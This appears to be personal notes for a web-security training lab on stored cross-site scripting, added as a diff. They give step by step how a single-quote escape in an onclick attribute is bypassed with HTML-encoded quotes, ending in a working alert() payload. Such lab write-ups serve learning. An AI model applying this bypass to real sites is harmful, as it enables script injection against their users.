@@ -1,0 +1,14 @@
+LAB INFO: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+MORE INFO:  This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
+
+
+LAB ANALYSIS:
+1. Open the view post do the comment there
+2. And in the web-dev tools we will see one onclick feature i.e onclick="var tracker={track(){}};tracker.track('https://www.google.com');
+3. Now we have to find a way to get the triggered xss popup here
+4. track('https://www.google.com'-alert()-'); ==> https://www.google.com'-alert()- {let's try this payload} ==>  onclick="var tracker={track(){}};tracker.track('https://www.google.com\'-alert()-');" ==> The single quote is not escaped so now let's try html encoded i.e &apos; for single quote
+
+5. https://www.google.com&apos;-alert()-&apos; ==> onclick="var tracker={track(){}};tracker.track('https://www.google.com'-alert()-''); ==> This does solved my lab.
